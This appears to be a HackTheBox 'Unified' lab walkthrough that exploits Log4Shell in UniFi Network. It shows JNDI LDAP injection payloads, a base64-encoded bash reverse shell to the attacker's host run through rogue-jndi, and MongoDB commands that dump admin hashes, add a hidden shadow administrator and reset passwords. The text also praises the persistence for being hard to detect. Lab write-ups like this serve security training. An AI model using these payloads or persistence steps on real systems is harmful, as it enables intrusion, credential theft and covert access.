# Unified
![hackthebox_logo](https://user-images.githubusercontent.com/83867734/141313996-2c2024f2-3775-4bfb-9809-5d51005379c3.png)

This exercise simulates an attack by exploiting log4j vulnerability.

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Parrot OS
* IP Address: 10.10.14.4

Victim:
* Name: victim_machine
* IP Address: 10.129.170.62
* Other information must be gathered during the attack

## Phase 1: Enumeration
```
$ nmap -sC -sV 10.129.170.62
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-18 00:24 CET
Nmap scan report for 10.129.170.62
Host is up (0.065s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
6789/tcp open  ibm-db2-admin?
8080/tcp open  http-proxy
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 431
|     Date: Thu, 17 Mar 2022 23:36:25 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 404 
|     Found</h1></body></html>
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 302 
|     Location: http://localhost:8080/manage
|     Content-Length: 0
|     Date: Thu, 17 Mar 2022 23:36:25 GMT
|     Connection: close
|   RTSPRequest, Socks5: 
|     HTTP/1.1 400 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 435
|     Date: Thu, 17 Mar 2022 23:36:25 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 400 
|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400 
|_    Request</h1></body></html>
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Did not follow redirect to https://10.129.170.62:8443/manage
8443/tcp open  ssl/nagios-nsca Nagios NSCA
| http-title: UniFi Network
|_Requested resource was /manage/account/login?redirect=%2Fmanage
| ssl-cert: Subject: commonName=UniFi/organizationName=Ubiquiti Inc./stateOrProvinceName=New York/countryName=US
| Subject Alternative Name: DNS:UniFi
| Not valid before: 2021-12-30T21:37:24
|_Not valid after:  2024-04-03T21:37:24
```
From this output, the interesting information is related to the port 8443 that exposes the `UniFi Network` software (we got the information due to `-sC` nmap option).

If we visit https://10.129.170.62:8443 by the browser, we access to a login page of this software. We can read also its version: 6.4.54.

By googling it as UniFi 6.4.54 exploit, we get CVE-2021-44228 vulnerability related to this application. Furthermore, some results shown this interesting article that could help us: https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi

## Phase 2: Foothold

The next step is to use Burpsuite, and check what are the parameters we send for a HTTP request and some useful information from the related HTTP response. The HTTP POST request is done by `/api/login` with the following parameters:
```
POST /api/login HTTP/1.1
Host: 10.129.170.62:8443
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://10.129.170.62:8443/manage/account/login?redirect=%2Fmanage
Content-Type: application/json; charset=utf-8
Origin: https://10.129.170.62:8443
Content-Length: 69
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close


{
    "username":"test",
    "password":"toast",
    "remember":false,
    "strict":true
}
```
The response has not useful information.

According the article above, we must use the `remember` parameter for injecting our payload to UniFi Network software. Our payload must be injected as the following form `${jndi:ldap://10.10.14.4/whatever}` so, since the Content-Type of the request is JSON, we must be sure that this payload was not parsed as JSON object. For doing this, we can enclose it by double quotes so it is seen as a string and not as a JSON object like: `"remember":"${jndi:ldap://10.10.14.4/whatever}"

If the request inside the payload causes the server to connect back to us, then we have verified that the application
is vulnerable.

<details>
  <summary>Click here to show JNDI and LDAP definition</summary>

**JNDI** is the acronym for the **Java Naming and Directory Interface** API . By making calls to this API,
applications locate resources and other program objects. A resource is a program object that provides
connections to systems, such as database servers and messaging systems.

**LDAP** is the acronym for **Lightweight Directory Access Protocol** , which is an open, vendor-neutral,
industry standard application protocol for accessing and maintaining distributed directory information
services over the Internet or a Network. The default port that LDAP runs on is port `389`.
</details>

In our case, we can directly inject the payload by Burpsuite, but first we need to listen on port `389` (LDAP):
```
$ sudo tcpdump -i tun0 port 389
```
Then, we can inject our test payload on Burp Repeater:
```
<SNIP>
{
    "username":"test",
    "password":"toast",
    "remember":"${jndi:ldap://10.10.14.4/whatever}",
    "strict":true
}
```
Despite the HTTP response has not useful information, from `tcpdump` we can see that our machine contacted the target and the target answered to us. It means that `remember` parameter is vulnerable.

According to the article above, in a general case we can also test the vulnerability of a parameter by using cURL for grabbing a hostname from [dnslog.cn](dnslog.cn). So, connect to [dnslog.cn](dnslog.cn) and click on `Get SubDomain` button. Take the output and insert it in the payload of the following cURL command:
```
$ curl -i -s -k -X POST -H $'Host: 10.129.170.62:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"test\",\"password\":\"toast\",\"remember\":\"${jndi:ldap://l47jom.dnslog.cn:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.170.62:8443/api/login'
```
Note: in our case this command does not work because the target machine cannot go out to Internet, so cannot contact dnslog.cn.

However, now that we know there is a vulnerable parameter, we can try to get a Remote Code Execution or a Reverse Shell, so we can interact with the underlying Linux operating system by `rogue-jndi` tool from the GitHub repository: https://github.com/veracode-research/rogue-jndi

**Rogue-JNDI** is a malicious LDAP server for JNDI injection attacks. The GitHub project contains LDAP & HTTP servers for exploiting insecure-by-default Java JNDI API.

So, rogue-jndi is a LDAP server we must run on our attacker machine. For working, it needs of Open-JDK and Maven installed on our machine, so install them and clone rogue-jndi repository.

<details>
  <summary>Click here to show Open-JDK and Maven definition</summary>
Open-JDK is the Java Development kit, which is used to build Java applications. Maven on the other hand is an Integrated Development Environment (IDE) that can be used to create a structured project and compile
our projects into jar files .
</details>

These two applications will also help us run the rogue-jndi Java application, which starts a local LDAP server
and allows us to receive connections back from the vulnerable server and execute malicious code. In particular, they allow us to build rogue-jndi Java application to get the related `.jar` file.

Once got the applications named above, build the Rogue-JNDI Java application by Maven:
```
$ git clone https://github.com/veracode-research/rogue-jndi
$ cd rogue-jndi
$ mvn package
```
This will create a `.jar` file in `rogue-jndi/target/` directory called `RogueJndi-1.1.jar`. Now we can
construct our payload to pass into the `RogueJndi-1-1.jar` Java application.

To use the Rogue-JNDI server we will have to construct and pass it a payload, which will be responsible for
giving us a shell on the affected system. We will be Base64 encoding the payload to prevent any encoding
issues:
```
$ echo 'bash -c bash -i >&/dev/tcp/10.10.14.4/4444 0>&1' | base64
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNC80NDQ0IDA+JjEK
```
Then, start the Rogue-JNDI application while passing in the payload as part of the `--command` option and Attacker Machine IP address to the `--hostname` option:
```
$ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNC80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}" --hostname "10.10.14.4"

Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
+-+-+-+-+-+-+-+-+-+
|R|o|g|u|e|J|n|d|i|
+-+-+-+-+-+-+-+-+-+
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.4:1389/o=websphere2 to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.4:1389/o=websphere2,jar=* to artsploit.controllers.WebSphere2
Mapping ldap://10.10.14.4:1389/ to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.4:1389/o=reference to artsploit.controllers.RemoteReference
Mapping ldap://10.10.14.4:1389/o=groovy to artsploit.controllers.Groovy
Mapping ldap://10.10.14.4:1389/o=websphere1 to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.4:1389/o=websphere1,wsdl=* to artsploit.controllers.WebSphere1
Mapping ldap://10.10.14.4:1389/o=tomcat to artsploit.controllers.Tomcat
```
Now our LDAP server is running. It is still not in contact with the target server. For doing this, we can use again Burp Repeater or cURL command for creating a session between the target machine and the attacker machine. When we'll do this, the target machine executes the command specified on the Rouge-JNDI LDAP server. It occurs because maybe:
* our malicious LDAP server is saying "any LDAP server that contacts me must execute locally the command I specified (i.e. the reverse shell)";
* or the target server contacts by LDAP the malicious server, and the malicious server answers by LDAP protocol to the target server by executing there the command specified (does it mean usually the LDAP servers are not restricted? All other LDAP servers in their network can execute commands?)
* or I don't know...

At this point it's better to run our `netcat` for listening on port `4444`:
```
$ nc -lvnp 4444
```
Successively, we force the target server to contact our malicious LDAP server by using Burp Repeater:
```
<SNIP>
{
    "username":"test",
    "password":"toast",
    "remember":"${jndi:ldap://10.10.14.4:1389/o=tomcat}",
    "strict":true
}
```
or if we want to use cURL:
```
$ curl -i -s -k -X POST -H $'Host: 10.129.170.62:8443' -H $'Content-Length: 104' --data-binary $'{\"username\":\"a\",\"password\":\"a\",\"remember\":\"${jndi:ldap://10.10.14.4:1389/o=tomcat}\",\"strict\":true}' $'https://10.129.170.62:8443/api/login'
```
Coming back to `netcat`, we got the shell (despite we get 400 status from HTTP response). We can get a semi-interactive shell by:
```
$ script /dev/null -c bash
```
Now we can get easily the flag of the user.

## Phase 3: Privilege Escalation Part 1
Now let's guess that several methods of privilege escalation that we know at OS level don't work. What can we do? Let's see if there is some running database. Maybe they don't contain information related to the root account but could have some information related to the administrators of the UniFi Network web application.

For checking it, let's see the running processes:
```
$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
unifi          1  0.0  0.0   1080     4 ?        Ss   Mar17   0:00 /sbin/docker-
unifi          7  0.0  0.1  18512  3136 ?        S    Mar17   0:00 bash /usr/loc
unifi         17  0.7 26.2 3680828 533424 ?      Sl   Mar17   1:51 java -Dunifi.
unifi         67  0.3  4.2 1100676 85736 ?       Sl   Mar17   0:44 bin/mongod --
unifi       6257  0.0  0.1  18380  3084 ?        S    01:26   0:00 bash -c {echo
unifi       6261  0.0  0.1  18512  3332 ?        S    01:26   0:00 bash -i
unifi       6264  0.0  0.1  18380  3104 ?        S    01:26   0:00 bash
unifi       6319  0.0  0.1  19312  2216 ?        S    01:28   0:00 script /dev/n
unifi       6320  0.0  0.0   4632   828 pts/0    Ss   01:28   0:00 sh -c bash
unifi       6321  0.0  0.1  18512  3488 pts/0    S    01:28   0:00 bash
unifi       6573  0.0  0.1  34408  2924 pts/0    R+   01:37   0:00 ps aux
```
We see that MongoDB is the running database!

<details>
  <summary>Click here to show MongoDB definition</summary>

**MongoDB** is a source-available cross-platform document-oriented database program. Classified as a NoSQL database program, MongoDB uses JSON-like documents with optional schemas.
</details>

From the semi-interactive shell, the `ps aux` command does not show all the characters. For getting the entire line related to the MongoDB process type:
```
$ ps aux | grep mongo
unifi         67  0.9  4.1 1102716 85284 ?       Sl   01:42   0:02 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
unifi        300  0.0  0.0  11468   996 pts/0    S+   01:47   0:00 grep mongo
```
Come to find out, as described by the article, the MongoDB instance storing all application information is listening on localhost on the port `27117` without authentication. That means that once you have shell access, you can read from and make modifications to the local MongoDB instance. 

Let's interact with the MongoDB service by making use of the `mongo` command line utility and attempting to extract the administrator password.

For first, let's see what are the databases inside this DBMS. We can discover it by running:
```
mongo --port 27117 --eval "db.adminCommand( { listDatabases: 1 } )"
```
The database of UniFi Network software is `ace`. It is also confirmed by searching on Google "UniFi Default Database".

Another useful command is the enumeration of users in a database. It could be executed by:
```
mongo --port 27117 <dbname> --eval "db.admin.find().forEach(printjson);"
```
We get different administrators and the most interesting seems to be `administrator`.

Maybe, "admin" in this specific MongoDB is a "collection" where several admins are stored, indeed I think the structure of these functions are `db.<collection>.method()`.

Other useful functions are `db.admin.insert()` for adding data to the database; `db.admin.update()` for updating information related the objects inside this collection.

However, now we have three options for getting the `administrator` account:
* Extract the password hashes for administrative accounts and attempt to crack them.
* Reset the password for an administrative user.
* Add our own shadow admin to provide access to the administrative console.

The first and third options are the most attractive as they theoretically provide access to the administrative console long after any patch is implemented and does not arouse suspicion. Once we have administrative access, we can quickly establish persistence and laterally move inside the network. In every Docker and bare metal install we’ve seen the MongoDB command-line utility available, which makes the following attack paths possible in almost all environments.

### Cracking Hashes
Running `mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`, let's get the value of the `x_shadow` variable:
```
<17 ace --eval "db.admin.find().forEach(printjson);"
MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
        "name" : "administrator",
        "email" : "administrator@unified.htb",
        "x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
        "time_created" : NumberLong(1640900495),
        "last_site_name" : "default",
<SNIP>
```
and crack this SHA-512 by hashcat:
```
$ echo -n '$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.' > sha512_tocrack.txt
$ hashcat -a 0 -m 1400 sha256_hash_example /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
Sadly, any of wordlists I used were able to crack the password.

### Shadow Admin
We can easily add our own shadow administrator account using the command line interface. With a lack of authentication we can execute a series of commands to add a local account.

First and foremost, we need to generate a password hash for our account using the `mkpasswd` command. Oddly enough, this utility is included in the apt whois package. Install whois and then execute the following command to generate a hash on your local system:
```
$ mkpasswd -m sha-512 mypassword

$6$XqwExB.PWVizrHx.$f1nRm0IsmpjowuOFX/gt9V2ibToY1c5vw2REmY/Mk2l/MEJuf7hna7VegxDGcpPQNyyr.7IUJ62kfPskJn/G8/
```
So, by the reverse shell, let's create a new admin account named `unifi-admin` for the web application (in general, the relevant variables are: `email`, `name`, `x_shadow`):
```
$ mongo --port 27117 ace --eval 'db.admin.insert({ "email" : "null@localhost.local", "last_site_name" : "default", "name" : "unifi-admin", "time_created" : NumberLong(100019800), "x_shadow" : "$6$XqwExB.PWVizrHx.$f1nRm0IsmpjowuOFX/gt9V2ibToY1c5vw2REmY/Mk2l/MEJuf7hna7VegxDGcpPQNyyr.7IUJ62kfPskJn/G8/" })'

MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
WriteResult({ "nInserted" : 1 })
```
Note: You can leave the `time_created` variable the same. It doesn’t matter unless you’re trying to confuse IR people.

Now, we must give grants to this new user. For doing this, by the listing user command, we must get the `ObjectId` of the user, in my case:
```
$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"

<SNIP>
{
        "_id" : ObjectId("623401f3d1cba481cf41ffb3"),
        "email" : "null@localhost.local",
        "last_site_name" : "default",
        "name" : "unifi-admin",
        "time_created" : NumberLong(100019800),
        "x_shadow" : "$6$XqwExB.PWVizrHx.$f1nRm0IsmpjowuOFX/gt9V2ibToY1c5vw2REmY/Mk2l/MEJuf7hna7VegxDGcpPQNyyr.7IUJ62kfPskJn/G8/",
        "ui_settings" : {
<SNIP>
```
Then, by using the `ObjectId` for refering to our user, let's type the following command to get a list of all sites associated with the appliance:
```
$ mongo --port 27117 ace --eval "db.site.find().forEach(printjson);"

MongoDB shell version v3.6.3
connecting to: mongodb://127.0.0.1:27117/ace
MongoDB server version: 3.6.3
{
        "_id" : ObjectId("61ce269d46e0fb0012d47ec4"),
        "anonymous_id" : "5abcfa17-8e78-4677-8898-d3ffdf9d957c",
        "name" : "super",
        "key" : "super",
        "attr_hidden_id" : "super",
        "attr_hidden" : true,
        "attr_no_delete" : true,
        "attr_no_edit" : true
}
{
        "_id" : ObjectId("61ce269d46e0fb0012d47ec5"),
        "anonymous_id" : "27593916-7dfe-4ce8-82de-b11f98c1e814",
        "name" : "default",
        "desc" : "Default",
        "attr_hidden_id" : "default",
        "attr_no_delete" : true
}
```
Store also the `ObjectId` of these two sites. Our purpose is to add the account `unifi-admin` to the site `super` and to the site "default". We can do it by respectively:
```
mongo --port 27117 ace --eval 'db.privilege.insert({ "admin_id" : "623401f3d1cba481cf41ffb3", "permissions" : [ ], "role" : "admin", "site_id" : "61ce269d46e0fb0012d47ec4" });'
```
for adding the account `unifi-admin` to the site `super`, and then:
```
mongo --port 27117 ace --eval 'db.privilege.insert({ "admin_id" : "623401f3d1cba481cf41ffb3", "permissions" : [ ], "role" : "admin", "site_id" : "61ce269d46e0fb0012d47ec5" });'
```
for adding the account `unifi-admin` to the site `default`.

Now, by the browser page, if we login with these credentials we created (`unifi-admin:mypassword`), we can access to the application dashboard with the right grants.

This attack path is beautiful for several reasons:
* It’s incredibly difficult to detect that an additional administrative account was added.
* No notifications are presented.
* IT has to navigate pretty deep into the system configuration options to actually see the new account.

### Reset Password for admin user
Since we were not able to crack the password of `administrator` user, we can change it.

Let's generate a password hash for our account using the `mkpasswd` command:
```
$ mkpasswd -m sha-512 mypassword

$6$XqwExB.PWVizrHx.$f1nRm0IsmpjowuOFX/gt9V2ibToY1c5vw2REmY/Mk2l/MEJuf7hna7VegxDGcpPQNyyr.7IUJ62kfPskJn/G8/
```
Let's proceed to replacing the existing hash with the one we created:
```
$ mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$XqwExB.PWVizrHx.$f1nRm0IsmpjowuOFX/gt9V2ibToY1c5vw2REmY/Mk2l/MEJuf7hna7VegxDGcpPQNyyr.7IUJ62kfPskJn/G8/"}})'
```
We can verify that the password has been updated in the Mongo database by running the same command
we used for listing users:
```
mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
```
and now we are able to login to the application by the browser.

## Phase 3: Privilege Escalation Part 2

Let's access on the web application with our admin account. Let's go to the Settings->System and disable the "New User Interface". Then, when you are moved to the old user interface, go to Settings->Site, and scroll down. You will see the `root` credential (`root:NotACrackablePassword4U2022`).

Use it for accessing by SSH to the machine and get the user and root flags!

Please, read also the last section of the [article](https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi) because contains very nice information.